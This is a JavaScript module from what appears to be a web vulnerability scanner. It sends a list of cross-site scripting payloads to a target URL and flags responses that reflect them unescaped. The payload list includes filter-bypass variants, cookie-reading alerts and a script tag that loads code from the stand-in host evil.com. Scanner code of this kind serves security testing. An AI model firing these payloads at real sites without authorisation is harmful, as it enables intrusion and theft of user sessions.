import httpClient from '../../utils/http-client.js';
import logger from '../../utils/logger.js';

/**
 * Cross-Site Scripting (XSS) Attack Module
 * ─────────────────────────────────────────
 * Sends common XSS payloads and checks whether the server reflects
 * them back unescaped — indicating a reflected XSS vulnerability.
 */

const XSS_PAYLOADS = [
  // Basic script injection
  '<script>alert("XSS")</script>',
  '<script>alert(document.cookie)</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<body onload=alert("XSS")>',

  // Event handler injection
  '" onmouseover="alert(\'XSS\')"',
  "' onfocus='alert(1)' autofocus='",
  '<input onfocus=alert(1) autofocus>',

  // URL-based
  'javascript:alert("XSS")',
  'data:text/html,<script>alert("XSS")</script>',

  // Encoded variants
  '%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E',
  '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',

  // Bypass filters
  '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
  '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
  '"><img src=x onerror=alert(1)//>',

  // DOM-based
  '#"><img src=x onerror=alert(1)>',
  '<div style="background:url(javascript:alert(1))">',
];

const REFLECTION_PATTERNS = [
  /<script[\s>]/i,
  /onerror\s*=/i,
  /onload\s*=/i,
  /onmouseover\s*=/i,
  /onfocus\s*=/i,
  /javascript:/i,
  /alert\s*\(/i,
  /<img[^>]+src\s*=\s*x/i,
  /<svg[^>]*onload/i,
];

/**
 * Run XSS tests against the target.
 * @param {string} targetUrl
 * @param {object} [options]
 * @returns {Promise<object>}
 */
export async function runXss(targetUrl, options = {}) {
  logger.info(`[XSS] Starting XSS tests on ${targetUrl}`);

  const results = {
    attackType: 'xss',
    targetUrl,
    totalPayloads: XSS_PAYLOADS.length,
    findings: [],
    vulnerable: false,
    severity: 'NONE',
    startTime: Date.now(),
    endTime: null,
  };

  for (const payload of XSS_PAYLOADS) {
    try {
      // ── GET with payload in query string ─────────────────────────
      const url = new URL(targetUrl);
      if ([...url.searchParams].length === 0) {
        url.searchParams.set('q', payload);
      } else {
        for (const [key] of url.searchParams) {
          url.searchParams.set(key, payload);
        }
      }

      const getRes = await httpClient.get(url.toString());

      // ── POST with payload in body ────────────────────────────────
      const postRes = await httpClient.post(targetUrl, {
        input: payload,
        comment: payload,
        name: payload,
        search: payload,
        message: payload,
      });

      // ── Check for reflection ─────────────────────────────────────
      for (const [method, res] of [['GET', getRes], ['POST', postRes]]) {
        const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data || '');
        const indicators = [];

        // Check if the raw payload is reflected back
        if (body.includes(payload)) {
          indicators.push('Payload reflected verbatim in response (unescaped)');
        }

        // Check for partial reflection patterns
        for (const pattern of REFLECTION_PATTERNS) {
          if (pattern.test(body) && body.toLowerCase().includes('alert')) {
            indicators.push(`Reflection pattern detected: ${pattern.source}`);
            break; // one match is enough
          }
        }

        // Check for missing Content-Type header (could enable sniffing)
        const contentType = res.headers?.['content-type'] || '';
        if (!contentType.includes('json') && body.includes(payload)) {
          indicators.push('Response is not JSON — reflected XSS more likely exploitable');
        }

        // Check for missing X-XSS-Protection header
        if (!res.headers?.['x-xss-protection']) {
          // Only note this if there's also reflection
          if (indicators.length > 0) {
            indicators.push('X-XSS-Protection header is missing');
          }
        }

        if (indicators.length > 0) {
          results.findings.push({
            payload,
            method,
            url: method === 'GET' ? url.toString() : targetUrl,
            statusCode: res.status,
            responseTime: res.duration || 0,
            indicators,
            responseSnippet: body.substring(0, 500),
          });
        }
      }
    } catch (err) {
      logger.warn(`[XSS] Payload failed: ${payload.substring(0, 40)} — ${err.message}`);
    }
  }

  // ── Severity assessment ────────────────────────────────────────────
  results.vulnerable = results.findings.length > 0;
  const reflectedCount = results.findings.filter((f) =>
    f.indicators.some((i) => i.includes('verbatim')),
  ).length;

  if (reflectedCount >= 3) {
    results.severity = 'HIGH';
  } else if (results.findings.length >= 3) {
    results.severity = 'MEDIUM';
  } else if (results.findings.length >= 1) {
    results.severity = 'LOW';
  }

  results.endTime = Date.now();
  results.durationMs = results.endTime - results.startTime;
  logger.info(`[XSS] Completed — ${results.findings.length} finding(s), severity: ${results.severity}`);

  return results;
}
